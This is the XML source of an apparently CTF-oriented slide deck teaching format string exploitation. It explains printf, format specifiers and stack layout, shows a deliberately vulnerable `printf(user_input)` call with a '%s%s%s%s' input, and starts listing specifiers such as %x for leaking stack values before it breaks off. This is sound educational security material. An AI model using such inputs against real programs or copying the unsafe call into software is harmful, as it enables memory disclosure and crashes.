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780000004B0D5A31215.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0084d1" draw:textarea-vertical-align="middle"/>
    </style:style>
    <style:style style:name="gr5" style:family="graphic" style:parent-style-name="standard">
      <style:graphic-properties draw:fill-color="#c5000b" draw:textarea-vertical-align="middle"/>
    </style:style>
    <style:style style:name="gr6" style:family="graphic" style:parent-style-name="standard">
      <style:graphic-properties draw:fill-color="#579d1c" draw:textarea-vertical-align="middle"/>
    </style:style>
    <style:style style:name="gr7" style:family="graphic" style:parent-style-name="standard">
      <style:graphic-properties draw:fill-color="#cccccc" draw:textarea-vertical-align="middle"/>
    </style:style>
    <style:style style:name="gr8" style:family="graphic" style:parent-style-name="standard">
      <style:graphic-properties draw:marker-start="Arrow" draw:textarea-vertical-align="middle"/>
    </style:style>
    <style:style style:name="gr9" style:family="graphic" style:parent-style-name="objectwithoutfill">
      <style:graphic-properties draw:stroke="solid" draw:stroke-dash="Ultrafine_20_Dashed" svg:stroke-width="0.254cm" svg:stroke-color="#cccccc" draw:marker-start="" draw:marker-start-width="0.965cm" draw:marker-end="Arrow" draw:marker-end-width="1.067cm" draw:fill="none" draw:textarea-vertical-align="middle" fo:padding-top="0.252cm" fo:padding-bottom="0.252cm" fo:padding-left="0.377cm" fo:padding-right="0.377cm"/>
    </style:style>
    <style:style style:name="gr10" style:family="graphic" style:parent-style-name="objectwithoutfill">
      <style:graphic-properties draw:stroke="solid" draw:stroke-dash="Ultrafine_20_Dashed" svg:stroke-width="0.254cm" svg:stroke-color="#cccccc" draw:marker-start="Arrow" draw:marker-start-width="0.965cm" draw:marker-end="" draw:marker-end-width="1.067cm" draw:fill="none" draw:textarea-vertical-align="middle" fo:padding-top="0.252cm" fo:padding-bottom="0.252cm" fo:padding-left="0.377cm" fo:padding-right="0.377cm"/>
    </style:style>
    <style:style style:name="gr11" style:family="graphic" style:parent-style-name="standard">
      <style:graphic-properties draw:stroke="none" draw:stroke-dash="Ultrafine_20_Dashed" svg:stroke-color="#000000" draw:marker-start="Arrow" draw:marker-end="Arrow" draw:fill="none" draw:fill-color="#ffffff" draw:auto-grow-height="true" draw:auto-grow-width="false" fo:max-height="0cm" fo:min-height="0cm"/>
    </style:style>
    <style:style style:name="gr12" style:family="graphic" style:parent-style-name="standard">
      <style:graphic-properties draw:stroke="solid" draw:stroke-dash="Ultrafine_20_Dashed" svg:stroke-width="0.102cm" svg:stroke-color="#cccccc" draw:marker-start="" draw:marker-start-width="0.509cm" draw:marker-end="Arrow" draw:marker-end-width="0.509cm" draw:textarea-vertical-align="middle" fo:padding-top="0.176cm" fo:padding-bottom="0.176cm" fo:padding-left="0.301cm" fo:padding-right="0.301cm"/>
    </style:style>
    <style:style style:name="gr13" style:family="graphic" style:parent-style-name="standard">
      <style:graphic-properties draw:stroke="none" draw:stroke-dash="Ultrafine_20_Dashed" svg:stroke-color="#000000" draw:marker-start="Arrow" draw:marker-end="Arrow" draw:fill="none" draw:fill-color="#ffffff" draw:auto-grow-height="true" draw:auto-grow-width="false" fo:max-height="0cm" fo:min-height="1.02cm"/>
    </style:style>
    <style:style style:name="gr14" style:family="graphic" style:parent-style-name="standard">
      <style:graphic-properties draw:stroke="none" draw:stroke-dash="Ultrafine_20_Dashed" svg:stroke-color="#000000" draw:marker-start="Arrow" draw:marker-end="Arrow" draw:fill="none" draw:fill-color="#ffffff" draw:auto-grow-height="true" draw:auto-grow-width="false" fo:max-height="0cm" fo:min-height="1.423cm"/>
    </style:style>
    <style:style style:name="gr15" style:family="graphic" style:parent-style-name="standard">
      <style:graphic-properties draw:stroke="solid" draw:stroke-dash="Ultrafine_20_Dashed" svg:stroke-width="0.102cm" svg:stroke-color="#c5000b" draw:marker-start="" draw:marker-start-width="0.509cm" draw:marker-end="Arrow" draw:marker-end-width="0.509cm" draw:textarea-vertical-align="middle" fo:padding-top="0.176cm" fo:padding-bottom="0.176cm" fo:padding-left="0.301cm" fo:padding-right="0.301cm"/>
    </style:style>
    <style:style style:name="gr16" style:family="graphic" style:parent-style-name="standard">
      <style:graphic-properties draw:stroke="none" draw:stroke-dash="Ultrafine_20_Dashed" draw:marker-start="Arrow" draw:marker-end="Arrow" draw:fill="none" fo:min-height="3.777cm"/>
    </style:style>
    <style:style style:name="gr17" style:family="graphic" style:parent-style-name="standard">
      <style:graphic-properties draw:stroke="none" draw:stroke-dash="Ultrafine_20_Dashed" draw:marker-start="Arrow" draw:marker-end="Arrow" draw:fill="none" fo:min-height="7.553cm"/>
    </style:style>
    <style:style style:name="gr18" style:family="graphic" style:parent-style-name="standard">
      <style:graphic-properties draw:stroke="none" draw:stroke-dash="Ultrafine_20_Dashed" draw:marker-start="Arrow" draw:marker-end="Arrow" draw:fill="none" fo:min-height="10.385cm"/>
    </style:style>
    <style:style style:name="gr19" style:family="graphic" style:parent-style-name="standard">
      <style:graphic-properties draw:stroke="none" draw:stroke-dash="Ultrafine_20_Dashed" draw:marker-start="Arrow" draw:marker-end="Arrow" draw:fill="none" fo:min-height="15.816cm"/>
    </style:style>
    <style:style style:name="gr20" style:family="graphic" style:parent-style-name="standard">
      <style:graphic-properties draw:stroke="none" draw:stroke-dash="Ultrafine_20_Dashed" svg:stroke-color="#000000" draw:marker-start="Arrow" draw:marker-end="Arrow" draw:fill="none" draw:fill-color="#ffffff" draw:auto-grow-height="true" draw:auto-grow-width="false" fo:max-height="0cm" fo:min-height="1.889cm"/>
    </style:style>
    <style:style style:name="gr21" style:family="graphic" style:parent-style-name="standard">
      <style:graphic-properties draw:marker-start="Arrow" draw:fill="solid" draw:fill-color="#ff3333" draw:textarea-vertical-align="middle"/>
    </style:style>
    <style:style style:name="gr22" style:family="graphic" style:parent-style-name="standard">
      <style:graphic-properties draw:stroke="none" draw:stroke-dash="Ultrafine_20_Dashed" draw:marker-start="Arrow" draw:marker-end="Arrow" draw:fill="none" fo:min-height="16.354cm"/>
    </style:style>
    <style:style style:name="gr23" style:family="graphic" style:parent-style-name="standard">
      <style:graphic-properties draw:stroke="none" draw:stroke-dash="Ultrafine_20_Dashed" draw:marker-start="Arrow" draw:marker-end="Arrow" draw:fill="none" fo:min-height="13.42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4.139cm"/>
    </style:style>
    <style:style style:name="pr3" style:family="presentation" style:parent-style-name="Default-subtitle">
      <style:graphic-properties draw:fill-color="#ffffff" draw:auto-grow-height="true" fo:min-height="4.813cm"/>
    </style:style>
    <style:style style:name="pr4" style:family="presentation" style:parent-style-name="Default-notes">
      <style:graphic-properties draw:fill-color="#ffffff" draw:auto-grow-height="true" fo:min-height="12.572cm"/>
    </style:style>
    <style:style style:name="pr5" style:family="presentation" style:parent-style-name="Default-outline1">
      <style:graphic-properties fo:min-height="11.929cm"/>
    </style:style>
    <style:style style:name="pr6" style:family="presentation" style:parent-style-name="Default-title">
      <style:graphic-properties fo:min-height="3.506cm"/>
    </style:style>
    <style:style style:name="pr7" style:family="presentation" style:parent-style-name="Default-notes" style:list-style-name="L1">
      <style:graphic-properties draw:fill-color="#ffffff" draw:auto-grow-height="true" fo:min-height="12.572cm"/>
    </style:style>
    <style:style style:name="P1" style:family="paragraph">
      <style:text-properties fo:font-size="32pt"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph">
      <style:text-properties fo:color="#009900" fo:font-size="32pt"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph">
      <style:paragraph-properties fo:text-align="center"/>
      <style:text-properties fo:font-size="32pt"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph">
      <style:paragraph-properties fo:text-align="center"/>
      <style:text-properties fo:color="#0084d1" fo:font-size="32pt"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph">
      <style:text-properties fo:font-size="18pt"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph">
      <style:text-properties fo:font-size="24pt" style:font-size-asian="24pt" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph">
      <style:paragraph-properties fo:text-align="center"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph">
      <style:paragraph-properties fo:text-align="center"/>
      <style:text-properties fo:font-size="18pt"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm"/>
      <style:text-properties fo:font-size="24pt"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm"/>
      <style:text-properties fo:font-size="24pt" style:font-size-asian="24pt" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph">
      <style:text-properties fo:font-size="24pt"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm"/>
      <style:text-properties fo:font-size="18pt"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm"/>
      <style:text-properties fo:color="#00cc00" fo:font-size="18pt" style:font-size-asian="18pt" style:font-size-complex="18pt"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph">
      <style:text-properties style:font-name="FreeMono1" fo:font-size="20pt"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph">
      <style:text-properties style:font-name="FreeMono1"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph">
      <style:text-properties fo:font-size="20pt"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties fo:font-size="36pt" style:font-size-asian="36pt" style:font-size-complex="36pt"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:color="#009900" fo:font-size="32pt"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:color="#0084d1" fo:font-size="32pt"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties fo:color="#00cc33"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:font-size="24pt" style:font-size-asian="24pt" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:color="#83caff" fo:font-size="24pt" style:font-size-asian="24pt" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:color="#aecf00" fo:font-size="24pt" style:font-size-asian="24pt" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:color="#0066cc" fo:font-size="24pt" style:font-size-asian="24pt" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:color="#00cc00" fo:font-size="24pt" style:font-size-asian="24pt" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties fo:color="#0000ff" fo:font-size="24pt" style:font-size-asian="24pt" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties fo:color="#00ccff" fo:font-size="24pt" style:font-size-asian="24pt" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties fo:color="#ffff00" fo:font-size="24pt" style:font-size-asian="24pt" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties fo:color="#ccff00" fo:font-size="24pt" style:font-size-asian="24pt" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties fo:color="#00cc00" fo:font-size="18pt" style:font-size-asian="18pt" style:font-size-complex="18pt"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties style:font-name="FreeMono1" fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties style:font-name="FreeMono1" fo:font-size="20pt"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties style:font-name="FreeMono1" fo:font-size="32pt" fo:font-weight="bold" style:letter-kerning="true" style:font-size-asian="32pt" style:font-weight-asian="bold" style:font-size-complex="32pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties style:font-name="FreeMono1" fo:font-size="32pt" style:letter-kerning="true"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3.097cm" presentation:class="title" presentation:user-transformed="true">
          <draw:text-box>
            <text:p><text:span text:style-name="T1">Exploiting Format String Vulnerabilities</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr2" draw:text-style-name="P2" draw:layer="layout" svg:width="11.808cm" svg:height="4.139cm" svg:x="8.095cm" svg:y="9.576cm" presentation:class="subtitle" presentation:user-transformed="true">
          <draw:text-box>
            <text:p text:style-name="P1"><text:span text:style-name="T2">@40byteCTF</text:span></text:p>
            <text:p text:style-name="P1"><text:span text:style-name="T2">github.com/40bytectf</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr3" draw:text-style-name="P4" draw:layer="layout" svg:width="11.684cm" svg:height="4.813cm" svg:x="1.269cm" svg:y="13.184cm">
          <draw:text-box>
            <text:p text:style-name="P3"><text:span text:style-name="T3">Chad Rikansrud</text:span></text:p>
            <text:p text:style-name="P3"><text:span text:style-name="T3">@zhroom_42</text:span></text:p>
            <text:p text:style-name="P3"><text:span text:style-name="T3">github.com/zhroom</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr3" draw:text-style-name="P4" draw:layer="layout" svg:width="12.7cm" svg:height="4.813cm" svg:x="13.969cm" svg:y="13.22cm">
          <draw:text-box>
            <text:p text:style-name="P3"><text:span text:style-name="T3">Spenser Reinhardt</text:span></text:p>
            <text:p text:style-name="P3"><text:span text:style-name="T3">@c0mmiebstrd</text:span></text:p>
            <text:p text:style-name="P3"><text:span text:style-name="T3">github.com/commiebstrd</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <presentation:notes draw:style-name="dp2">
          <draw:page-thumbnail draw:style-name="gr1" draw:layer="layout" svg:width="13.968cm" svg:height="10.476cm" svg:x="3.81cm" svg:y="2.123cm" draw:page-number="1" presentation:class="page"/>
          <draw:frame presentation:style-name="pr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399cm" svg:y="0.836cm" presentation:class="title">
          <draw:text-box>
            <text:p><text:span text:style-name="T1">Overview</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr5" draw:layer="layout" svg:width="21.714cm" svg:height="12.179cm" svg:x="3.142cm" svg:y="4.913cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-item>
                <text:p>What is printf()?</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>printf(“%s”, “Format strings?”);</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>printf(“%s%s%s”, “This is”, “an”, “argument”); </text:p>
              </text:list-item>
              <text:list-item>
                <text:p>printf(Im_Vulnerable?);</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>printf(“%xploit”, me);</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>printf(Challenge_1);</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>printf(Challenge_2);</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>printf(Challenge_3);</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399cm" svg:y="0.836cm" presentation:class="title">
          <draw:text-box>
            <text:p><text:span text:style-name="T1">What is Printf()?</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr5" draw:layer="layout" svg:width="25.199cm" svg:height="12.179cm" svg:x="1.399cm" svg:y="4.913cm" presentation:class="outline">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-header>
                <text:p>The printf built-in function writes output to an implementation-defined stream such as stdout under control of the string pointed to by format that specifies how subsequent arguments are converted for output. <text:span text:style-name="T4">If there are insufficient arguments for the format, the behavior is undefined.</text:span> If the format is exhausted while arguments remain, the excess arguments are evaluated (as always) but are otherwise ignored. The printf function returns when the end of the format string is encountered. </text:p>
              </text:list-header>
            </text:list>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:style-name="gr2" draw:text-style-name="P5" draw:layer="layout" svg:width="22.346cm" svg:height="0.963cm" svg:x="2.826cm" svg:y="19.557cm">
          <draw:text-box>
            <text:p text:style-name="P5">https://www.khronos.org/registry/cl/sdk/1.2/docs/man/xhtml/printfFunction.html</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399cm" svg:y="0.836cm" presentation:class="title">
          <draw:text-box>
            <text:p><text:span text:style-name="T1">printf(“%s”, “Format strings?”);</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr5" draw:layer="layout" svg:width="25.199cm" svg:height="12.179cm" svg:x="1.399cm" svg:y="4.913cm" presentation:class="outline">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-header>
                <text:p>The format shall be a character sequence, beginning and ending in its initial shift state. The format is composed of zero or more directives: ordinary characters (not %), which are copied unchanged to the output stream; and conversion specifications, each of which results in fetching zero or more subsequent arguments, converting them, if applicable, according to the corresponding conversion specifier, and then writing the result to the output stream. As format is in the constant address space it must be resolvable at compile time and thus cannot be dynamically created by the executing program, itself.</text:p>
              </text:list-header>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printf(“%s %d”, “Format strings?”, 2);</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr5" draw:text-style-name="P6" draw:layer="layout" svg:width="24.253cm" svg:height="14.898cm" svg:x="1.873cm" svg:y="4.913cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-item>
                <text:p><text:span text:style-name="T5">A format specifier follows this prototype:</text:span></text:p>
                <text:p><text:span text:style-name="T5"><text:s text:c="2"/></text:span><text:span text:style-name="T5">%</text:span><text:span text:style-name="T6">[flags]</text:span><text:span text:style-name="T7">[width]</text:span><text:span text:style-name="T8">[.precision]</text:span><text:span text:style-name="T9">[length]</text:span><text:span text:style-name="T10">specifier</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T6">[flags] – Used for justification and characters prior to the specifier.</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T7">[width] – Specifies a minimum number of characters to be printed, regardless of argument size.</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T8">[.precision] – Specifieds a minimum number of digits to print, after the decimal point in some cases.</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T9">[length] <text:s/>- Modifies length of the given specifier, allowing for specific type usage.</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p><text:span text:style-name="T10">Specifier – Defines the type and interpretation of the corresponding argument</text:span></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How Does Printf() Work?</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr5" draw:layer="layout" svg:width="14.856cm" svg:height="1.436cm" svg:x="6.571cm" svg:y="4.913cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-header>
                <text:p>Printf(“%s %d”, string, int);</text:p>
              </text:list-header>
            </text:list>
          </draw:text-box>
        </draw:frame>
        <draw:rect draw:style-name="gr3" draw:text-style-name="P7" draw:layer="layout" svg:width="9.652cm" svg:height="11.43cm" svg:x="8.635cm" svg:y="7.619cm">
          <text:p/>
        </draw:rect>
        <draw:rect draw:style-name="gr4" draw:text-style-name="P8" draw:layer="layout" svg:width="9.652cm" svg:height="1.778cm" svg:x="8.635cm" svg:y="17.271cm">
          <text:p text:style-name="P8">Address of format string</text:p>
        </draw:rect>
        <draw:rect draw:style-name="gr5" draw:text-style-name="P8" xml:id="id1" draw:id="id1" draw:layer="layout" svg:width="9.652cm" svg:height="1.778cm" svg:x="8.635cm" svg:y="15.493cm">
          <text:p text:style-name="P8">Address of string</text:p>
        </draw:rect>
        <draw:rect draw:style-name="gr6" draw:text-style-name="P8" draw:layer="layout" svg:width="9.652cm" svg:height="1.778cm" svg:x="8.635cm" svg:y="13.715cm">
          <text:p text:style-name="P8">Value of int</text:p>
        </draw:rect>
        <draw:rect draw:style-name="gr7" draw:text-style-name="P8" draw:layer="layout" svg:width="9.652cm" svg:height="4.318cm" svg:x="8.635cm" svg:y="9.397cm">
          <text:p text:style-name="P8">Other Stack Frames</text:p>
        </draw:rect>
        <draw:rect draw:style-name="gr8" draw:text-style-name="P8" xml:id="id2" draw:id="id2" draw:layer="layout" svg:width="9.652cm" svg:height="1.778cm" svg:x="8.635cm" svg:y="7.619cm">
          <text:p text:style-name="P8">Value of string</text:p>
        </draw:rect>
        <draw:line draw:style-name="gr9" draw:text-style-name="P7" draw:layer="layout" svg:x1="7.619cm" svg:y1="7.873cm" svg:x2="7.619cm" svg:y2="19.049cm">
          <text:p/>
        </draw:line>
        <draw:line draw:style-name="gr10" draw:text-style-name="P7" draw:layer="layout" svg:x1="6.349cm" svg:y1="14.477cm" svg:x2="6.349cm" svg:y2="19.049cm">
          <text:p/>
        </draw:line>
        <draw:line draw:style-name="gr9" draw:text-style-name="P7" draw:layer="layout" svg:x1="21.335cm" svg:y1="18.541cm" svg:x2="18.541cm" svg:y2="18.541cm">
          <text:p/>
        </draw:line>
        <draw:frame draw:style-name="gr11" draw:text-style-name="P5" draw:layer="layout" svg:width="4.318cm" svg:height="1.673cm" svg:x="3.555cm" svg:y="7.724cm">
          <draw:text-box>
            <text:p text:style-name="P5">Stack grows</text:p>
            <text:p text:style-name="P5">this direction</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:style-name="gr11" draw:text-style-name="P5" draw:layer="layout" svg:width="4.318cm" svg:height="1.673cm" svg:x="1.777cm" svg:y="17.017cm">
          <draw:text-box>
            <text:p text:style-name="P5">Prinf() moves this direction</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:connector draw:style-name="gr12" draw:text-style-name="P7" draw:layer="layout" svg:x1="18.287cm" svg:y1="16.382cm" svg:x2="18.287cm" svg:y2="8.508cm" draw:start-shape="id1" draw:start-glue-point="1" draw:end-shape="id2" draw:end-glue-point="1" svg:d="m18287 16382h501v-7874h-501" svg:viewBox="0 0 502 7875">
          <text:p/>
        </draw:connector>
        <draw:frame draw:style-name="gr13" draw:text-style-name="P5" draw:layer="layout" svg:width="5.334cm" svg:height="1.27cm" svg:x="21.589cm" svg:y="18.033cm">
          <draw:text-box>
            <text:p text:style-name="P5">Printf()'s pointer</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:style-name="gr11" draw:text-style-name="P5" draw:layer="layout" svg:width="4.318cm" svg:height="1.673cm" svg:x="19.811cm" svg:y="10.921cm">
          <draw:text-box>
            <text:p text:style-name="P5">Printf()'s use of char *</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How Does This Make Printf() Vulnerable?</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:rect draw:style-name="gr3" draw:text-style-name="P7" draw:layer="layout" svg:width="9.652cm" svg:height="11.176cm" svg:x="8.635cm" svg:y="7.873cm">
          <text:p/>
        </draw:rect>
        <draw:rect draw:style-name="gr4" draw:text-style-name="P8" xml:id="id11" draw:id="id11" draw:layer="layout" svg:width="9.652cm" svg:height="1.016cm" svg:x="8.635cm" svg:y="18.033cm">
          <text:p text:style-name="P8">Address of user_input</text:p>
        </draw:rect>
        <draw:rect draw:style-name="gr5" draw:text-style-name="P8" xml:id="id3" draw:id="id3" draw:layer="layout" svg:width="9.652cm" svg:height="1.016cm" svg:x="8.635cm" svg:y="17.017cm">
          <text:p text:style-name="P8">Address of string?</text:p>
        </draw:rect>
        <draw:rect draw:style-name="gr8" draw:text-style-name="P8" xml:id="id4" draw:id="id4" draw:layer="layout" svg:width="9.652cm" svg:height="1.524cm" svg:x="8.635cm" svg:y="12.445cm">
          <text:p text:style-name="P8">Value of string?</text:p>
        </draw:rect>
        <draw:line draw:style-name="gr9" draw:text-style-name="P7" draw:layer="layout" svg:x1="7.619cm" svg:y1="7.873cm" svg:x2="7.619cm" svg:y2="19.049cm">
          <text:p/>
        </draw:line>
        <draw:line draw:style-name="gr10" draw:text-style-name="P7" draw:layer="layout" svg:x1="6.349cm" svg:y1="14.477cm" svg:x2="6.349cm" svg:y2="19.049cm">
          <text:p/>
        </draw:line>
        <draw:frame draw:style-name="gr11" draw:text-style-name="P5" draw:layer="layout" svg:width="4.318cm" svg:height="1.673cm" svg:x="3.555cm" svg:y="7.724cm">
          <draw:text-box>
            <text:p text:style-name="P5">Stack grows</text:p>
            <text:p text:style-name="P5">this direction</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:connector draw:style-name="gr12" draw:text-style-name="P7" draw:layer="layout" svg:x1="18.287cm" svg:y1="17.525cm" svg:x2="18.287cm" svg:y2="13.207cm" draw:start-shape="id3" draw:start-glue-point="1" draw:end-shape="id4" draw:end-glue-point="1" svg:d="m18287 17525h501v-4318h-501" svg:viewBox="0 0 502 4319">
          <text:p/>
        </draw:connector>
        <draw:frame draw:style-name="gr11" draw:text-style-name="P5" draw:layer="layout" svg:width="4.318cm" svg:height="1.673cm" svg:x="22.859cm" svg:y="11.026cm">
          <draw:text-box>
            <text:p text:style-name="P5">Printf()'s use of char *</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:rect draw:style-name="gr5" draw:text-style-name="P8" xml:id="id5" draw:id="id5" draw:layer="layout" svg:width="9.652cm" svg:height="1.016cm" svg:x="8.635cm" svg:y="16.001cm">
          <text:p text:style-name="P8">Address of string?</text:p>
        </draw:rect>
        <draw:rect draw:style-name="gr5" draw:text-style-name="P8" xml:id="id7" draw:id="id7" draw:layer="layout" svg:width="9.652cm" svg:height="1.016cm" svg:x="8.635cm" svg:y="14.985cm">
          <text:p text:style-name="P8">Address of string?</text:p>
        </draw:rect>
        <draw:rect draw:style-name="gr5" draw:text-style-name="P8" xml:id="id9" draw:id="id9" draw:layer="layout" svg:width="9.652cm" svg:height="1.016cm" svg:x="8.635cm" svg:y="13.969cm">
          <text:p text:style-name="P8">Address of string?</text:p>
        </draw:rect>
        <draw:frame draw:style-name="gr14" draw:text-style-name="P5" draw:layer="layout" svg:width="10.414cm" svg:height="1.673cm" svg:x="8.381cm" svg:y="4.168cm">
          <draw:text-box>
            <text:p text:style-name="P5">char * user_input = “%s%s%s%s”;</text:p>
            <text:p text:style-name="P5">printf(user_input);</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:rect draw:style-name="gr8" draw:text-style-name="P8" xml:id="id6" draw:id="id6" draw:layer="layout" svg:width="9.652cm" svg:height="1.524cm" svg:x="8.635cm" svg:y="10.921cm">
          <text:p text:style-name="P8">Value of string?</text:p>
        </draw:rect>
        <draw:rect draw:style-name="gr8" draw:text-style-name="P8" xml:id="id8" draw:id="id8" draw:layer="layout" svg:width="9.652cm" svg:height="1.524cm" svg:x="8.635cm" svg:y="9.397cm">
          <text:p text:style-name="P8">Value of string?</text:p>
        </draw:rect>
        <draw:rect draw:style-name="gr8" draw:text-style-name="P8" xml:id="id10" draw:id="id10" draw:layer="layout" svg:width="9.652cm" svg:height="1.524cm" svg:x="8.635cm" svg:y="7.873cm">
          <text:p text:style-name="P8">Value of string?</text:p>
        </draw:rect>
        <draw:connector draw:style-name="gr12" draw:text-style-name="P7" draw:layer="layout" svg:x1="18.287cm" svg:y1="16.509cm" svg:x2="18.287cm" svg:y2="11.683cm" draw:start-shape="id5" draw:start-glue-point="1" draw:end-shape="id6" draw:end-glue-point="1" svg:d="m18287 16509h501v-4826h-501" svg:viewBox="0 0 502 4827">
          <text:p/>
        </draw:connector>
        <draw:connector draw:style-name="gr12" draw:text-style-name="P7" draw:layer="layout" svg:x1="18.287cm" svg:y1="15.493cm" svg:x2="18.287cm" svg:y2="10.159cm" draw:start-shape="id7" draw:start-glue-point="1" draw:end-shape="id8" draw:end-glue-point="1" svg:d="m18287 15493h501v-5334h-501" svg:viewBox="0 0 502 5335">
          <text:p/>
        </draw:connector>
        <draw:connector draw:style-name="gr12" draw:text-style-name="P7" draw:layer="layout" svg:x1="18.287cm" svg:y1="14.477cm" svg:x2="18.287cm" svg:y2="8.635cm" draw:start-shape="id9" draw:start-glue-point="1" draw:end-shape="id10" draw:end-glue-point="1" svg:d="m18287 14477h501v-5842h-501" svg:viewBox="0 0 502 5843">
          <text:p/>
        </draw:connector>
        <draw:rect draw:style-name="gr8" draw:text-style-name="P8" xml:id="id12" draw:id="id12" draw:layer="layout" svg:width="9.652cm" svg:height="1.524cm" svg:x="8.635cm" svg:y="6.349cm">
          <text:p text:style-name="P8">user_input</text:p>
        </draw:rect>
        <draw:connector draw:style-name="gr15" draw:text-style-name="P7" draw:layer="layout" svg:x1="18.287cm" svg:y1="18.541cm" svg:x2="18.287cm" svg:y2="7.111cm" draw:start-shape="id11" draw:start-glue-point="1" draw:end-shape="id12" draw:end-glue-point="1" svg:d="m18287 18541h501v-11430h-501" svg:viewBox="0 0 502 11431">
          <text:p/>
        </draw:connector>
        <draw:frame draw:style-name="gr11" draw:text-style-name="P5" draw:layer="layout" svg:width="4.318cm" svg:height="1.673cm" svg:x="1.777cm" svg:y="17.018cm">
          <draw:text-box>
            <text:p text:style-name="P5">Prinf() moves this direction</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Format Specifiers for Exploiting Printf()</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr5" draw:text-style-name="P6" draw:layer="layout" svg:width="25.199cm" svg:height="12.179cm" svg:x="1.4cm" svg:y="4.41cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-item>
                <text:p><text:span text:style-name="T11">%x – Prints the value on the stack as hex address</text:span></text:p>
                <text:p><text:span text:style-name="T9">Largely used to pull addresses from the stack and easy moving up the stack.</text:span></text:p>
              </text:list-item>
              <text:list-item>
